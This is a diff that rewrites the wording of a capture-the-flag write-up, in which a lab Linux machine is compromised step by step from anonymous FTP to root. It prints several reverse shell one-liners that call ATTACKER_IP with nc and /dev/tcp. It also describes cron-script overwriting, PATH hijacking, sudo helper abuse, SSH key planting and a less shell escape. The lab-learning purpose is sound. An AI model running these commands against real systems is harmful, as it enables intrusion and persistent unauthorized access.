@@ -5,24 +5,20 @@
 You’ve discovered a misconfigured internal automation pipeline running on a Linux server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.
 
 Your objective is to escalate from anonymous access all the way through:
-<p align="center">
-
 `anonymous access → recon_user → dev_user → monitor_user → ops_user → root`
-
-</p>
 
 ---
 ## Reconnaissance
 
-The `nmap` scan found two open ports:
+An `nmap` scan turned up two open ports:
 
 ![Nmap scan](images/basic_nmap_scan.png)
 
-Since the machine had port 21 open, with an FTP service running on it, I tried anonymous FTP login which resulted in success:
+Port 21 was open with FTP running, so I tried logging in anonymously — and it worked straight away:
 
 ![FTP login](images/ftp_anonymous.png)
 
-After logging into FTP I found one interesting file named `README.txt`:
+Browsing the FTP server, I found a file called `README.txt`:
 
 ```text
 [ recon pipeline ]
@@ -32,7 +28,7 @@ Files are processed automatically on arrival.
 Invalid formats are ignored.
 ```
 
-It stated that all files placed in `incoming/` folder are processed automatically on arrival. Since I had access to FTP and `incoming/` I created reverse shell, uploaded it using `put` and obtained `recon_user` flag:
+So anything dropped into `incoming/` gets picked up automatically. Since I already had write access to that folder over FTP, I uploaded a reverse shell script with `put` and got a callback — along with the `recon_user` flag:
 
 ![First flag](images/first_flag.png)
 
@@ -41,17 +37,17 @@ Reverse shell used:
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 ```
+
 ## Escalation to `dev_user`
 
-After obtaining reverse shell as a `recon_user` I downloaded `psp64` tool and run it looking for unusual processes. Two processes that were performed regularly caught my attention:
+With a shell as `recon_user`, I pulled down `pspy64` to watch what was running in the background. Two processes kept popping up on a schedule:
 
 ```
 2026/08/16 06:23:01 CMD: UID=1002  PID=3151   | /bin/bash /opt/dev/backup.sh 
 2026/08/16 07:21:58 CMD: UID=1003  PID=2546   | /bin/bash /usr/local/bin/healthcheck 
-
 ```
 
-The `/healthcheck` process run as a `monitor_user` and `/backup.sh` as a `dev_user`. I navigated to `/opt/dev` and inspected backup.sh:
+`healthcheck` ran as `monitor_user`, and `backup.sh` ran as `dev_user`. I headed to `/opt/dev` and had a look at `backup.sh`:
 
 ```bash
 #!/bin/bash
@@ -60,18 +56,19 @@ tar -czf /tmp/recon_backup.tgz /home/recon_user
 
 ![Backup.sh permissions](images/backup_permissions.png)
 
-The backup.sh script could be modified by users, who belonged to `dev_user` group. Since the `recon_user` belonged to `dev_user` group I overwrote `backup.sh` with a reverse shell, caught a connection and obtained `dev_user` flag:
+Turns out anyone in the `dev_user` group could edit this script — and `recon_user` happened to be in that group. So I overwrote `backup.sh` with a reverse shell payload, waited for the next scheduled run, and caught a shell as `dev_user`:
 
-![[second_flag.png]]
+![Second flag](images/second_flag.png)
 
 Reverse shell used:
 
 ```bash
 /bin/bash -i >& /dev/tcp/ATTACKER_IP/8888 0>&1
 ```
+
 ## Escalation to `monitor_user`
 
-After gaining access to `dev_user` I inspected `/healthcheck` process found earlier:
+Now as `dev_user`, I went back to look at that `healthcheck` process I'd spotted earlier:
 
 ```bash
 #!/bin/bash
@@ -82,11 +79,11 @@ while true; do
 done
 ```
 
-Also I found `ps` script owned by `dev_user` located in `/opt/dev/bin`. Since the `healthcheck` ran `ps` without specifying its path, it was possible that it ran `/opt/dev/bin/ps` instead of `/usr/bin/ps`. To confirm that I checked `/etc/systemd/system` and found `healtcheck.service`. After inspecting it I confirmed that the `healthcheck` indeed used `/opt/dev/bin/` path while looking for `ps`:
+I also noticed a `ps` binary sitting in `/opt/dev/bin`, owned by `dev_user`. Since `healthcheck` calls `ps` without giving a full path, there was a good chance it would pick up `/opt/dev/bin/ps` before the real one, depending on how its `PATH` was set. I checked `/etc/systemd/system` for a `healthcheck.service` unit to confirm, and sure enough — it was searching `/opt/dev/bin` first:
 
 ![Healthcheck path](images/healthcheck_path.png)
 
-Knowing that I wrote reverse shell to `/opt/dev/bin/ps`, made it executable and read `monitor_user` flag:
+So I dropped a reverse shell into `/opt/dev/bin/ps`, made it executable, and waited. The next time `healthcheck` ran, it executed my fake `ps` instead of the real one, giving me a shell as `monitor_user`:
 
 ![Third flag](images/third_flag.png)
 
@@ -95,9 +92,10 @@ Reverse shell used:
 ```bash
 /bin/bash -i 5<> /dev/tcp/ATTACKER_IP/9001 0<&5 1>&5 2>&5
 ```
+
 ## Escalation to `ops_user`
 
-Next I searched for files and directories that belonged to `ops_user`:
+Next, I searched for anything owned by `ops_user`:
 
 ```bash
 find / -user ops_user 2>/dev/null
@@ -106,11 +104,11 @@ find / -user ops_user 2>/dev/null
 /home/ops_user
 ```
 
-I also run `sudo -l` which revealed that I could execute `/deploy.sh` as a `ops_user`
+A quick `sudo -l` showed I could run `/deploy.sh` as `ops_user`:
 
 ![Deploy as ops](images/deploy_as_ops.png)
 
-I inspected `/deploy.sh` and found out that it executed `/deploy_helper.sh`:
+Looking inside `deploy.sh`, it turned out to just call another script, `deploy_helper.sh`:
 
 ```bash
 #!/bin/bash
@@ -118,77 +116,79 @@ cd /opt/app 2>/dev/null
 ./deploy_helper.sh
 ```
 
-I found `/deploy_helper.sh` script in `/opt/app` directory. This script was owned by `monitor_user` which meant that I could write reverse shell to `deploy_helper.sh` and execute `deploy.sh` as `ops_user`. Thanks to that I obtained `ops_user` flag:
+I found `deploy_helper.sh` sitting in `/opt/app` — and it was owned by `monitor_user`, the account I'd just gotten into. That meant I could overwrite it with a reverse shell, run `deploy.sh` via `sudo`, and have my payload execute as `ops_user`. Sure enough, that's exactly what happened:
 
 ![Fourth flag](images/fourth_flag.png)
- 
- Reverse shell used:
- 
- ```bash
- /bin/bash -i 5<> /dev/tcp/ATTACKER_IP/9000 0<&5 1>&5 2>&5
- ```
+
+Reverse shell used:
+
+```bash
+/bin/bash -i 5<> /dev/tcp/ATTACKER_IP/9000 0<&5 1>&5 2>&5
+```
+
 ## Escalation to root
 
 ### First way — Reading the flag directly
 
-Running `sudo -l` showed that `ops_user` was permitted to run `less` as root. This alone was enough to read `/root/flag.txt` and retrieve the final flag:
+Running `sudo -l` as `ops_user` showed I could run `less` as root — which alone was enough to open `/root/flag.txt` and grab the final flag:
 
 ![Root flag](images/root_flag.png)
 
-This method retrieves the flag but does not actually escalate privileges to root. `less` can normally be used to spawn a shell (`!` followed by a command), but this didn't work over the reverse shell, since that shell wasn't a fully interactive TTY. To use `less` for privilege escalation, an SSH session was required instead.
+That gets the flag, but it doesn't actually give root. Normally you can break out of `less` into a shell with `!`, but that didn't work over my reverse shell since it wasn't a proper interactive TTY. To actually get a root shell out of this, I needed to come in over SSH instead.
 
 ### Second way — Escalating via SSH and `less`
 
-On the `ops_user` reverse shell, an `.ssh` directory was created with the correct permissions:
+From the `ops_user` reverse shell, I set up an `.ssh` directory with the right permissions:
 
 ```bash
 mkdir .ssh
 chmod 600 .ssh
 ```
 
-On the attacking machine, an SSH key pair was generated:
+On my own machine, I generated a fresh SSH key pair:
 
 ```bash
 ssh-keygen -t ed25519 -f key
 ```
 
-The contents of the public key, `key.pub`, were copied and added to `.ssh/authorized_keys` on the target, with the correct permissions set:
+I copied the public key from `key.pub` and dropped it into `.ssh/authorized_keys` on the target, again setting the correct permissions:
 
 ```bash
 chmod 600 authorized_keys
 ```
 
-With the key in place, it was possible to log in as `ops_user` over SSH:
+With that in place, I could SSH in directly as `ops_user`:
 
 ```bash
 ssh -i key ops_user@MACHINE_IP
 ```
 
-This provided a fully interactive shell, which allowed `less` to be used as intended:
+This time I had a proper interactive shell, so `less` behaved as expected:
 
 ```bash
 sudo less flag.txt
 ```
 
-From within `less`, typing `!` followed by `/bin/bash` spawned a root shell, completing the privilege escalation:
+From inside `less`, typing `!` followed by `/bin/bash` dropped me into a root shell:
 
 ![Root](images/root.png)
 
 ---
+
 ## Kill Chain
 
-The attack started with **anonymous FTP access**, which allowed uploading a malicious script and gaining an initial foothold as `recon_user`.
+The whole thing kicked off with **anonymous FTP access**, which was enough to upload a malicious script and land a foothold as `recon_user`.
 
-From there, the attack progressed through several trust boundaries:
+From there, it was a matter of walking up through one trust boundary after another:
 
 `Anonymous FTP → recon_user → dev_user → monitor_user → ops_user → root`
 
 - **Initial Access:** Anonymous FTP upload → reverse shell as `recon_user`
-- **Privilege Escalation:** Abused a writable backup script → `dev_user`
-- **Privilege Escalation:** PATH hijacking through `healthcheck` → `monitor_user`
-- **Privilege Escalation:** Abused `sudo` permissions and a writable deployment helper → `ops_user`
-- **Final Escalation:** SSH access + `sudo less` → root shell
+- **Privilege Escalation:** Abused a group-writable backup script → `dev_user`
+- **Privilege Escalation:** PATH hijacking via `healthcheck` → `monitor_user`
+- **Privilege Escalation:** Abused `sudo` rights plus a writable deployment helper script → `ops_user`
+- **Final Escalation:** SSH access combined with `sudo less` → root shell
 
-The machine primarily relied on **misconfigured permissions, insecure automation and trust between different users and services**, allowing the compromise to progress through the entire system.
+At its core, this box came down to **loose permissions, unsafe automation, and too much implicit trust between users and services** — every one of those weak links chained together to take it from anonymous FTP all the way to root.
 
 > Thanks for reading!
